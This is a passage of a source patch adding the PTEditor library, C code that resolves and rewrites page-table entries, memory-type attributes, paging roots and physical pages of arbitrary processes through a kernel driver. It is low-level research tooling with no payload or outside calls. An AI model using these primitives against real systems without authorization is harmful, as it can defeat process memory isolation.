++ * @param[in] mt The PAT/MAIR ID (from 0 to 7)
++ *
++ * @return The PAT/MAIR value (can be one of PTEDIT_MT_*)
++ *
++ */
++ptedit_fnc char ptedit_get_mt(unsigned char mt);
++
++/**
++ * Programs the value of a specific memory type attribute (PAT/MAIR).
++ *
++ * @param[in] mt The PAT/MAIR ID (from 0 to 7)
++ * @param[in] value The PAT/MAIR value (can be one of PTEDIT_MT_*)
++ *
++ */
++ptedit_fnc void ptedit_set_mt(unsigned char mt, unsigned char value);
++
++/**
++ * Generates a bitmask of all memory type attributes (PAT/MAIR) which are
++ * programmed to the given value.
++ *
++ * @param[in] type A memory type, i.e., PAT/MAIR value (one of PTEDIT_MT_*)
++ *
++ * @return A bitmask where a set bit indicates that the corresponding PAT/MAIR
++ * has the given type
++ *
++ */
++ptedit_fnc unsigned char ptedit_find_mt(unsigned char type);
++
++/**
++ * Returns the first memory type attribute (PAT/MAIR) which is programmed to the
++ * given memory type.
++ *
++ * @param[in] type A memory type, i.e., PAT/MAIR value (one of PTEDIT_MT_*)
++ *
++ * @return A PAT/MAIR ID, or -1 if no PAT/MAIR of this type was found
++ *
++ */
++ptedit_fnc int ptedit_find_first_mt(unsigned char type);
++
++/**
++ * Returns a new page-table entry which uses the given memory type (PAT/MAIR).
++ *
++ * @param[in] entry A page-table entry
++ * @param[in] mt A PAT/MAIR ID (between 0 and 7)
++ *
++ * @return A new page-table entry with the given memory type (PAT/MAIR)
++ *
++ */
++ptedit_fnc size_t ptedit_apply_mt(size_t entry, unsigned char mt);
++
++/**
++ * Returns the memory type (i.e., PAT/MAIR ID) which is used by a page-table
++ * entry.
++ *
++ * @param[in] entry A page-table entry
++ *
++ * @return A PAT/MAIR ID (between 0 and 7)
++ *
++ */
++ptedit_fnc unsigned char ptedit_extract_mt(size_t entry);
++
++/**
++ * Returns a human-readable representation of a memory type (PAT/MAIR value).
++ *
++ * @param[in] mt A memory type (PAT/MAIR value, e.g., one of PTEDIT_MT_*)
++ *
++ * @return A human-readable representation of the memory type
++ *
++ */
++ptedit_fnc const char* ptedit_mt_to_string(unsigned char mt);
++
++/** @} */
++
++/**
++ * Pretty print
++ *
++ * @defgroup PRETTYPRINT Pretty print
++ *
++ * @{
++ */
++
++/**
++ * Pretty prints a ptedit_entry_t struct.
++ *
++ * @param[in] entry A ptedit_entry_t struct
++ *
++ */
++ptedit_fnc void ptedit_print_entry_t(ptedit_entry_t entry);
++
++/**
++ * Pretty prints a page-table entry.
++ *
++ * @param[in] entry A page-table entry
++ *
++ */
++ptedit_fnc void ptedit_print_entry(size_t entry);
++
++/**
++ * Prints a single line of the pretty-print representation of a page-table
++ * entry.
++ *
++ * @param[in] entry A page-table entry
++ * @param[in] line The line to print (0 to 3)
++ *
++ */
++ptedit_fnc void ptedit_print_entry_line(size_t entry, int line);
++
++/** @} */
++
++#endif
++#include <fcntl.h>
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++
++#if defined(LINUX)
++#include <sys/ioctl.h>
++#include <sys/mman.h>
++#include <unistd.h>
++#else
++#include <Windows.h>
++#endif
++
++#if defined(LINUX)
++#define PTEDIT_COLOR_RED "\x1b[31m"
++#define PTEDIT_COLOR_GREEN "\x1b[32m"
++#define PTEDIT_COLOR_RESET "\x1b[0m"
++#else
++#define PTEDIT_COLOR_RED ""
++#define PTEDIT_COLOR_GREEN ""
++#define PTEDIT_COLOR_RESET ""
++#endif
++
++#if defined(WINDOWS)
++#define NO_WINDOWS_SUPPORT                                       \
++  fprintf(stderr,                                                \
++          PTEDIT_COLOR_RED "[-]" PTEDIT_COLOR_RESET              \
++                           "Error: %s not supported on Windows", \
++          __func__);
++#endif
++
++#if defined(WINDOWS)
++static HANDLE ptedit_fd;
++#else
++static int ptedit_fd;
++#endif
++static int ptedit_umem;
++static int ptedit_pagesize;
++static size_t ptedit_paging_root;
++static unsigned char* ptedit_vmem;
++
++typedef struct {
++  int has_pgd, has_p4d, has_pud, has_pmd, has_pt;
++  int pgd_entries, p4d_entries, pud_entries, pmd_entries, pt_entries;
++  int page_offset;
++} ptedit_paging_definition_t;
++
++ptedit_paging_definition_t ptedit_paging_definition;
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc ptedit_entry_t ptedit_resolve_kernel(void* address,
++                                                                 pid_t pid) {
++  ptedit_entry_t vm;
++  memset(&vm, 0, sizeof(vm));
++  vm.vaddr = (size_t)address;
++  vm.pid = (size_t)pid;
++#if defined(LINUX)
++  ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_VM_RESOLVE, (size_t)&vm);
++#else
++  NO_WINDOWS_SUPPORT;
++#endif
++  return vm;
++}
++
++// ---------------------------------------------------------------------------
++typedef size_t (*ptedit_phys_read_t)(size_t);
++typedef void (*ptedit_phys_write_t)(size_t, size_t);
++
++// ---------------------------------------------------------------------------
++static inline size_t ptedit_phys_read_map(size_t address) {
++  return *(size_t*)(ptedit_vmem + address);
++}
++
++// ---------------------------------------------------------------------------
++static inline void ptedit_phys_write_map(size_t address, size_t value) {
++  *(size_t*)(ptedit_vmem + address) = value;
++}
++
++// ---------------------------------------------------------------------------
++static inline size_t ptedit_phys_read_pread(size_t address) {
++  size_t val = 0;
++#if defined(LINUX)
++  if (pread(ptedit_umem, &val, sizeof(size_t), address) == -1) {
++    return val;
++  }
++#else
++  ULONG returnLength;
++  DeviceIoControl(ptedit_fd, PTEDITOR_READ_PHYS_VAL, (LPVOID)&address,
++                  sizeof(address), (LPVOID)&val, sizeof(val), &returnLength, 0);
++#endif
++  return val;
++}
++
++// ---------------------------------------------------------------------------
++static inline void ptedit_phys_write_pwrite(size_t address, size_t value) {
++#if defined(LINUX)
++  if (pwrite(ptedit_umem, &value, sizeof(size_t), address) == -1) {
++    return;
++  }
++#else
++  ULONG returnLength;
++  size_t info[2];
++  info[0] = address;
++  info[1] = value;
++  DeviceIoControl(ptedit_fd, PTEDITOR_WRITE_PHYS_VAL, (LPVOID)&info,
++                  sizeof(info), (LPVOID)&info, sizeof(info), &returnLength, 0);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++static ptedit_entry_t ptedit_resolve_user_ext(void* address,
++                                              pid_t pid,
++                                              ptedit_phys_read_t deref) {
++  size_t root = (pid == 0) ? ptedit_paging_root : ptedit_get_paging_root(pid);
++
++  int pgdi, p4di, pudi, pmdi, pti;
++  size_t addr = (size_t)address;
++  pgdi = (addr >> (ptedit_paging_definition.page_offset +
++                   ptedit_paging_definition.pt_entries +
++                   ptedit_paging_definition.pmd_entries +
++                   ptedit_paging_definition.pud_entries +
++                   ptedit_paging_definition.p4d_entries)) %
++         (int)(1ull << ptedit_paging_definition.pgd_entries);
++  p4di = (addr >> (ptedit_paging_definition.page_offset +
++                   ptedit_paging_definition.pt_entries +
++                   ptedit_paging_definition.pmd_entries +
++                   ptedit_paging_definition.pud_entries)) %
++         (int)(1ull << ptedit_paging_definition.p4d_entries);
++  pudi = (addr >> (ptedit_paging_definition.page_offset +
++                   ptedit_paging_definition.pt_entries +
++                   ptedit_paging_definition.pmd_entries)) %
++         (int)(1ull << ptedit_paging_definition.pud_entries);
++  pmdi = (addr >> (ptedit_paging_definition.page_offset +
++                   ptedit_paging_definition.pt_entries)) %
++         (int)(1ull << ptedit_paging_definition.pmd_entries);
++  pti = (addr >> ptedit_paging_definition.page_offset) %
++        (int)(1ull << ptedit_paging_definition.pt_entries);
++
++  ptedit_entry_t resolved;
++  memset(&resolved, 0, sizeof(resolved));
++  resolved.vaddr = (size_t)address;
++  resolved.pid = (size_t)pid;
++  resolved.valid = 0;
++
++  if (!root)
++    return resolved;
++
++  size_t pgd_entry, p4d_entry, pud_entry, pmd_entry, pt_entry;
++
++  //     printf("%zx + CR3(%zx) + PGDI(%zx) * 8 = %zx\n", ptedit_vmem, root,
++  //     pgdi, ptedit_vmem + root + pgdi * sizeof(size_t));
++  pgd_entry = deref(root + pgdi * sizeof(size_t));
++  if (ptedit_cast(pgd_entry, ptedit_pgd_t).present != PTEDIT_PAGE_PRESENT) {
++    return resolved;
++  }
++  resolved.pgd = pgd_entry;
++  resolved.valid |= PTEDIT_VALID_MASK_PGD;
++  if (ptedit_paging_definition.has_p4d) {
++    size_t pfn = (size_t)(ptedit_cast(pgd_entry, ptedit_pgd_t).pfn);
++    p4d_entry = deref(pfn * ptedit_pagesize + p4di * sizeof(size_t));
++    resolved.valid |= PTEDIT_VALID_MASK_P4D;
++  } else {
++    p4d_entry = pgd_entry;
++  }
++  resolved.p4d = p4d_entry;
++
++  if (ptedit_cast(p4d_entry, ptedit_p4d_t).present != PTEDIT_PAGE_PRESENT) {
++    return resolved;
++  }
++
++  if (ptedit_paging_definition.has_pud) {
++    size_t pfn = (size_t)(ptedit_cast(p4d_entry, ptedit_p4d_t).pfn);
++    pud_entry = deref(pfn * ptedit_pagesize + pudi * sizeof(size_t));
++    resolved.valid |= PTEDIT_VALID_MASK_PUD;
++  } else {
++    pud_entry = p4d_entry;
++  }
++  resolved.pud = pud_entry;
++
++  if (ptedit_cast(pud_entry, ptedit_pud_t).present != PTEDIT_PAGE_PRESENT) {
++    return resolved;
++  }
++
++  if (ptedit_paging_definition.has_pmd) {
++    size_t pfn = (size_t)(ptedit_cast(pud_entry, ptedit_pud_t).pfn);
++    pmd_entry = deref(pfn * ptedit_pagesize + pmdi * sizeof(size_t));
++    resolved.valid |= PTEDIT_VALID_MASK_PMD;
++  } else {
++    pmd_entry = pud_entry;
++  }
++  resolved.pmd = pmd_entry;
++
++  if (ptedit_cast(pmd_entry, ptedit_pmd_t).present != PTEDIT_PAGE_PRESENT) {
++    return resolved;
++  }
++
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  if (!ptedit_cast(pmd_entry, ptedit_pmd_t).size) {
++#endif
++    // normal 4kb page
++    size_t pfn = (size_t)(ptedit_cast(pmd_entry, ptedit_pmd_t).pfn);
++    pt_entry = deref(pfn * ptedit_pagesize + pti * sizeof(size_t));  // pt[pti];
++    resolved.pte = pt_entry;
++    resolved.valid |= PTEDIT_VALID_MASK_PTE;
++    if (ptedit_cast(pt_entry, ptedit_pte_t).present != PTEDIT_PAGE_PRESENT) {
++      return resolved;
++    }
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  }
++#endif
++  return resolved;
++}
++
++// ---------------------------------------------------------------------------
++static ptedit_entry_t ptedit_resolve_user(void* address, pid_t pid) {
++  return ptedit_resolve_user_ext(address, pid, ptedit_phys_read_pread);
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static ptedit_entry_t ptedit_resolve_user_map(void* address,
++                                                               pid_t pid) {
++  return ptedit_resolve_user_ext(address, pid, ptedit_phys_read_map);
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_update_kernel(void* address,
++                                                      pid_t pid,
++                                                      ptedit_entry_t* vm) {
++  vm->vaddr = (size_t)address;
++  vm->pid = (size_t)pid;
++#if defined(LINUX)
++  ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_VM_UPDATE, (size_t)vm);
++#else
++  NO_WINDOWS_SUPPORT
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc void ptedit_update_user_ext(void* address,
++                                       pid_t pid,
++                                       ptedit_entry_t* vm,
++                                       ptedit_phys_write_t pset) {
++  ptedit_entry_t current = ptedit_resolve(address, pid);
++  size_t root = (pid == 0) ? ptedit_paging_root : ptedit_get_paging_root(pid);
++
++  if (!root)
++    return;
++
++  size_t pgdi, p4di, pudi, pmdi, pti;
++  size_t addr = (size_t)address;
++  pgdi = (addr >> (ptedit_paging_definition.page_offset +
++                   ptedit_paging_definition.pt_entries +
++                   ptedit_paging_definition.pmd_entries +
++                   ptedit_paging_definition.pud_entries +
++                   ptedit_paging_definition.p4d_entries)) %
++         (1ull << ptedit_paging_definition.pgd_entries);
++  p4di = (addr >> (ptedit_paging_definition.page_offset +
++                   ptedit_paging_definition.pt_entries +
++                   ptedit_paging_definition.pmd_entries +
++                   ptedit_paging_definition.pud_entries)) %
++         (1ull << ptedit_paging_definition.p4d_entries);
++  pudi = (addr >> (ptedit_paging_definition.page_offset +
++                   ptedit_paging_definition.pt_entries +
++                   ptedit_paging_definition.pmd_entries)) %
++         (1ull << ptedit_paging_definition.pud_entries);
++  pmdi = (addr >> (ptedit_paging_definition.page_offset +
++                   ptedit_paging_definition.pt_entries)) %
++         (1ull << ptedit_paging_definition.pmd_entries);
++  pti = (addr >> ptedit_paging_definition.page_offset) %
++        (1ull << ptedit_paging_definition.pt_entries);
++
++  if ((vm->valid & PTEDIT_VALID_MASK_PTE) &&
++      (current.valid & PTEDIT_VALID_MASK_PTE)) {
++    pset((size_t)ptedit_cast(current.pmd, ptedit_pmd_t).pfn * ptedit_pagesize +
++             pti *
++                 (ptedit_pagesize / (1 << ptedit_paging_definition.pt_entries)),
++         vm->pte);
++  }
++  if ((vm->valid & PTEDIT_VALID_MASK_PMD) &&
++      (current.valid & PTEDIT_VALID_MASK_PMD) &&
++      ptedit_paging_definition.has_pmd) {
++    pset((size_t)ptedit_cast(current.pud, ptedit_pud_t).pfn * ptedit_pagesize +
++             pmdi * (ptedit_pagesize /
++                     (1 << ptedit_paging_definition.pmd_entries)),
++         vm->pmd);
++  }
++  if ((vm->valid & PTEDIT_VALID_MASK_PUD) &&
++      (current.valid & PTEDIT_VALID_MASK_PUD) &&
++      ptedit_paging_definition.has_pud) {
++    pset((size_t)ptedit_cast(current.p4d, ptedit_p4d_t).pfn * ptedit_pagesize +
++             pudi * (ptedit_pagesize /
++                     (1 << ptedit_paging_definition.pud_entries)),
++         vm->pud);
++  }
++  if ((vm->valid & PTEDIT_VALID_MASK_P4D) &&
++      (current.valid & PTEDIT_VALID_MASK_P4D) &&
++      ptedit_paging_definition.has_p4d) {
++    pset((size_t)ptedit_cast(current.pgd, ptedit_pgd_t).pfn * ptedit_pagesize +
++             p4di * (ptedit_pagesize /
++                     (1 << ptedit_paging_definition.p4d_entries)),
++         vm->p4d);
++  }
++  if ((vm->valid & PTEDIT_VALID_MASK_PGD) &&
++      (current.valid & PTEDIT_VALID_MASK_PGD) &&
++      ptedit_paging_definition.has_pgd) {
++    pset(root + pgdi * (ptedit_pagesize /
++                        (1 << ptedit_paging_definition.pgd_entries)),
++         vm->pgd);
++  }
++
++  ptedit_invalidate_tlb(address);
++}
++
++// ---------------------------------------------------------------------------
++static void ptedit_update_user(void* address, pid_t pid, ptedit_entry_t* vm) {
++  ptedit_update_user_ext(address, pid, vm, ptedit_phys_write_pwrite);
++  ptedit_invalidate_tlb(address);
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static void ptedit_update_user_map(void* address,
++                                                    pid_t pid,
++                                                    ptedit_entry_t* vm) {
++  ptedit_update_user_ext(address, pid, vm, ptedit_phys_write_map);
++  ptedit_invalidate_tlb(address);
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void* ptedit_pmap(size_t physical, size_t length) {
++#if defined(LINUX)
++  char* m =
++      (char*)mmap(0, length + (physical % ptedit_pagesize),
++                  PROT_READ | PROT_WRITE, MAP_SHARED, ptedit_umem,
++                  ((size_t)(physical / ptedit_pagesize)) * ptedit_pagesize);
++  return m + (physical % ptedit_pagesize);
++#else
++  NO_WINDOWS_SUPPORT;
++  return NULL;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc size_t ptedit_set_pfn(size_t pte, size_t pfn) {
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  pte &= ~(((1ull << 40) - 1) << 12);
++#elif defined(__aarch64__)
++  pte &= ~(((1ull << 36) - 1) << 12);
++#endif
++  pte |= pfn << 12;
++  return pte;
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc size_t ptedit_get_pfn(size_t pte) {
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  return (pte & (((1ull << 40) - 1) << 12)) >> 12;
++#elif defined(__aarch64__)
++  return (pte & (((1ull << 36) - 1) << 12)) >> 12;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++#define PTEDIT_B(val, bit) (!!((val) & (1ull << (bit))))
++
++#define PEDIT_PRINT_B(fmt, bit) \
++  if ((bit)) {                  \
++    printf(PTEDIT_COLOR_GREEN); \
++    printf((fmt), (bit));       \
++    printf(PTEDIT_COLOR_RESET); \
++  } else {                      \
++    printf((fmt), (bit));       \
++  }                             \
++  printf("|");
++
++// ---------------------------------------------------------------------------
++ptedit_fnc void ptedit_print_entry_line(size_t entry, int line) {
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  if (line == 0 || line == 3)
++    printf("+--+------------------+-+-+-+-+-+-+-+-+--+--+-+-+-+\n");
++  if (line == 1)
++    printf("|NX|       PFN        |H|?|?|?|G|S|D|A|UC|WT|U|W|P|\n");
++  if (line == 2) {
++    printf("|");
++    PEDIT_PRINT_B(" %d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_NX));
++    printf(" %16p |", (void*)((entry >> 12) & ((1ull << 40) - 1)));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_PAT_LARGE));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_SOFTW3));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_SOFTW2));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_SOFTW1));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_GLOBAL));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_PSE));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_DIRTY));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_ACCESSED));
++    PEDIT_PRINT_B(" %d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_PCD));
++    PEDIT_PRINT_B(" %d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_PWT));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_USER));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_RW));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, PTEDIT_PAGE_BIT_PRESENT));
++    printf("\n");
++  }
++#elif defined(__aarch64__)
++  if (line == 0 || line == 3) {
++    printf("+--+--+--+---+-+--+------------------+--+-+-+-+--+---+-+\n");
++  }
++  if (line == 1) {
++    printf("| ?| ?|XN|PXN|C| ?|        PFN       |NG|A|S|P|NS|MAI|T|\n");
++  }
++  if (line == 2) {
++    printf("|");
++    PEDIT_PRINT_B("%2d", (PTEDIT_B(entry, 63) << 4) |
++                             (PTEDIT_B(entry, 62) << 3) |
++                             (PTEDIT_B(entry, 61) << 2) |
++                             (PTEDIT_B(entry, 60) << 1) | PTEDIT_B(entry, 59));
++    PEDIT_PRINT_B("%2d", (PTEDIT_B(entry, 58) << 3) |
++                             (PTEDIT_B(entry, 57) << 2) |
++                             (PTEDIT_B(entry, 56) << 1) | PTEDIT_B(entry, 55));
++    PEDIT_PRINT_B(" %d", PTEDIT_B(entry, 54));
++    PEDIT_PRINT_B(" %d ", PTEDIT_B(entry, 53));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, 52));
++    PEDIT_PRINT_B("%2d", (PTEDIT_B(entry, 51) << 3) |
++                             (PTEDIT_B(entry, 50) << 2) |
++                             (PTEDIT_B(entry, 49) << 1) | PTEDIT_B(entry, 48));
++    printf(" %16p |", (void*)((entry >> 12) & ((1ull << 36) - 1)));
++    PEDIT_PRINT_B(" %d", PTEDIT_B(entry, 11));
++    PEDIT_PRINT_B("%d", PTEDIT_B(entry, 10));
++    PEDIT_PRINT_B("%d", (PTEDIT_B(entry, 9) << 1) | PTEDIT_B(entry, 8));
++    PEDIT_PRINT_B("%d", (PTEDIT_B(entry, 7) << 1) | PTEDIT_B(entry, 6));
++    PEDIT_PRINT_B(" %d", PTEDIT_B(entry, 5));
++    PEDIT_PRINT_B(" %d ", (PTEDIT_B(entry, 4) << 2) |
++                              (PTEDIT_B(entry, 3) << 1) | PTEDIT_B(entry, 2));
++    PEDIT_PRINT_B("%d", (PTEDIT_B(entry, 1) << 1) | PTEDIT_B(entry, 0));
++    printf("\n");
++  }
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc void ptedit_print_entry(size_t entry) {
++  int i = 0;
++  for (i = 0; i < 4; i++) {
++    ptedit_print_entry_line(entry, i);
++  }
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_print_entry_t(ptedit_entry_t entry) {
++  if (entry.valid & PTEDIT_VALID_MASK_PGD) {
++    printf("PGD of address\n");
++    ptedit_print_entry(entry.pgd);
++  }
++  if (entry.valid & PTEDIT_VALID_MASK_P4D) {
++    printf("P4D of address\n");
++    ptedit_print_entry(entry.p4d);
++  }
++  if (entry.valid & PTEDIT_VALID_MASK_PUD) {
++    printf("PUD of address\n");
++    ptedit_print_entry(entry.pud);
++  }
++  if (entry.valid & PTEDIT_VALID_MASK_PMD) {
++    printf("PMD of address\n");
++    ptedit_print_entry(entry.pmd);
++  }
++  if (entry.valid & PTEDIT_VALID_MASK_PTE) {
++    printf("PTE of address\n");
++    ptedit_print_entry(entry.pte);
++  }
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc int ptedit_init() {
++#if defined(LINUX)
++  ptedit_fd = open(PTEDITOR_DEVICE_PATH, O_RDONLY);
++  if (ptedit_fd < 0) {
++    fprintf(stderr,
++            PTEDIT_COLOR_RED "[-]" PTEDIT_COLOR_RESET
++                             "Error: Could not open PTEditor device: %s\n",
++            PTEDITOR_DEVICE_PATH);
++    return -1;
++  }
++  ptedit_umem = open("/proc/umem", O_RDWR);
++#else
++  ptedit_fd = CreateFile(PTEDITOR_DEVICE_PATH, GENERIC_ALL, 0, 0, OPEN_EXISTING,
++                         FILE_ATTRIBUTE_SYSTEM, 0);
++  if (ptedit_fd == INVALID_HANDLE_VALUE) {
++    fprintf(stderr,
++            PTEDIT_COLOR_RED "[-]" PTEDIT_COLOR_RESET
++                             "Error: Could not open PTEditor device: %ws\n",
++            PTEDITOR_DEVICE_PATH);
++    return -1;
++  }
++  ptedit_umem = 0;
++#endif
++#if defined(LINUX)
++  ptedit_use_implementation(PTEDIT_IMPL_KERNEL);
++#elif defined(WINDOWS)
++  ptedit_use_implementation(PTEDIT_IMPL_USER_PREAD);
++#endif
++  //   }
++#if defined(LINUX)
++  ptedit_pagesize = getpagesize();
++#else
++  ptedit_pagesize = ptedit_get_pagesize();
++#endif
++
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  ptedit_paging_definition.has_pgd = 1;
++  ptedit_paging_definition.has_p4d = 0;
++  ptedit_paging_definition.has_pud = 1;
++  ptedit_paging_definition.has_pmd = 1;
++  ptedit_paging_definition.has_pt = 1;
++  ptedit_paging_definition.pgd_entries = 9;
++  ptedit_paging_definition.p4d_entries = 0;
++  ptedit_paging_definition.pud_entries = 9;
++  ptedit_paging_definition.pmd_entries = 9;
++  ptedit_paging_definition.pt_entries = 9;
++  ptedit_paging_definition.page_offset = 12;
++#elif defined(__aarch64__)
++  ptedit_paging_definition.has_pgd = 1;
++  ptedit_paging_definition.has_p4d = 0;
++  ptedit_paging_definition.has_pud = 0;
++  ptedit_paging_definition.has_pmd = 1;
++  ptedit_paging_definition.has_pt = 1;
++  ptedit_paging_definition.pgd_entries = 9;
++  ptedit_paging_definition.p4d_entries = 0;
++  ptedit_paging_definition.pud_entries = 0;
++  ptedit_paging_definition.pmd_entries = 9;
++  ptedit_paging_definition.pt_entries = 9;
++  ptedit_paging_definition.page_offset = 12;
++#endif
++  return 0;
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc void ptedit_cleanup() {
++#if defined(LINUX)
++  if (ptedit_fd >= 0) {
++    close(ptedit_fd);
++  }
++  if (ptedit_umem > 0) {
++    close(ptedit_umem);
++  }
++#else
++  CloseHandle(ptedit_fd);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc void ptedit_use_implementation(int implementation) {
++  if (implementation == PTEDIT_IMPL_KERNEL) {
++#if defined(LINUX)
++    ptedit_resolve = ptedit_resolve_kernel;
++    ptedit_update = ptedit_update_kernel;
++#else
++    fprintf(stderr, PTEDIT_COLOR_RED
++            "[-]" PTEDIT_COLOR_RESET
++            "Error: PTEditor implementation not supported on Windows");
++#endif
++  } else if (implementation == PTEDIT_IMPL_USER_PREAD) {
++    ptedit_resolve = ptedit_resolve_user;
++    ptedit_update = ptedit_update_user;
++    ptedit_paging_root = ptedit_get_paging_root(0);
++  } else if (implementation == PTEDIT_IMPL_USER) {
++#if defined(LINUX)
++    ptedit_resolve = ptedit_resolve_user_map;
++    ptedit_update = ptedit_update_user_map;
++    ptedit_paging_root = ptedit_get_paging_root(0);
++    if (!ptedit_vmem) {
++      ptedit_vmem =
++          (unsigned char*)mmap(NULL, 32ull << 30ull, PROT_READ | PROT_WRITE,
++                               MAP_SHARED | MAP_NORESERVE, ptedit_umem, 0);
++      fprintf(stderr,
++              PTEDIT_COLOR_GREEN "[+]" PTEDIT_COLOR_RESET
++                                 " Mapped physical memory to %p\n",
++              ptedit_vmem);
++    }
++#else
++    fprintf(stderr, PTEDIT_COLOR_RED
++            "[-]" PTEDIT_COLOR_RESET
++            "Error: PTEditor implementation not supported on Windows");
++#endif
++  } else {
++    fprintf(stderr, PTEDIT_COLOR_RED
++            "[-]" PTEDIT_COLOR_RESET
++            " Error: PTEditor implementation not supported!\n");
++  }
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc int ptedit_get_pagesize() {
++#if defined(LINUX)
++  return (int)ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_GET_PAGESIZE, 0);
++#else
++  SYSTEM_INFO sysinfo;
++  GetSystemInfo(&sysinfo);
++  return sysinfo.dwPageSize;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_read_physical_page(size_t pfn,
++                                                           char* buffer) {
++#if defined(LINUX)
++  if (ptedit_umem > 0) {
++    if (pread(ptedit_umem, buffer, ptedit_pagesize, pfn * ptedit_pagesize) ==
++        -1) {
++      return;
++    }
++  } else {
++    ptedit_page_t page;
++    page.buffer = (unsigned char*)buffer;
++    page.pfn = pfn;
++    ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_READ_PAGE, (size_t)&page);
++  }
++#else
++  DWORD returnLength;
++  pfn *= ptedit_pagesize;
++  DeviceIoControl(ptedit_fd, PTEDITOR_READ_PAGE, (LPVOID)&pfn, sizeof(pfn),
++                  (LPVOID)buffer, 4096, &returnLength, 0);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_write_physical_page(size_t pfn,
++                                                            char* content) {
++#if defined(LINUX)
++  if (ptedit_umem > 0) {
++    if (pwrite(ptedit_umem, content, ptedit_pagesize, pfn * ptedit_pagesize) ==
++        -1) {
++      return;
++    }
++  } else {
++    ptedit_page_t page;
++    page.buffer = (unsigned char*)content;
++    page.pfn = pfn;
++    ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_WRITE_PAGE, (size_t)&page);
++  }
++#else
++  DWORD returnLength;
++  ptedit_page_t page;
++  if (ptedit_pagesize != 4096) {
++    fprintf(stderr, PTEDIT_COLOR_RED
++            "[-]" PTEDIT_COLOR_RESET
++            "Error: page sizes other than 4096 not supported on Windows");
++    return;
++  }
++  page.paddr = pfn * ptedit_pagesize;
++  memcpy(page.content, content, ptedit_pagesize);
++  DeviceIoControl(ptedit_fd, PTEDITOR_WRITE_PAGE, (LPVOID)&page,
++                  sizeof(ptedit_page_t), (LPVOID)&page, sizeof(ptedit_page_t),
++                  &returnLength, 0);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc size_t ptedit_get_paging_root(pid_t pid) {
++#if defined(LINUX)
++  ptedit_paging_t cr3;
++  cr3.pid = (size_t)pid;
++  cr3.root = 0;
++  ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_GET_ROOT, (size_t)&cr3);
++  return cr3.root;
++#else
++  size_t cr3 = 0;
++  DWORD returnLength;
++  if (!pid)
++    pid = GetCurrentProcessId();
++  DeviceIoControl(ptedit_fd, PTEDITOR_GET_CR3, (LPVOID)&pid, sizeof(pid),
++                  (LPVOID)&cr3, sizeof(cr3), &returnLength, 0);
++  return (cr3 & ~0xfff);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc void ptedit_set_paging_root(pid_t pid, size_t root) {
++  ptedit_paging_t cr3;
++  cr3.pid = (size_t)pid;
++  cr3.root = root;
++#if defined(LINUX)
++  ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_SET_ROOT, (size_t)&cr3);
++#else
++  DWORD returnLength;
++  if (!pid)
++    pid = GetCurrentProcessId();
++  size_t info[2];
++  info[0] = pid;
++  info[1] = root;
++  DeviceIoControl(ptedit_fd, PTEDITOR_SET_CR3, (LPVOID)info, sizeof(info),
++                  (LPVOID)info, sizeof(info), &returnLength, 0);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc void ptedit_invalidate_tlb(void* address) {
++#if defined(LINUX)
++  ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_INVALIDATE_TLB, (size_t)address);
++#else
++  size_t vaddr = (size_t)address;
++  DWORD returnLength;
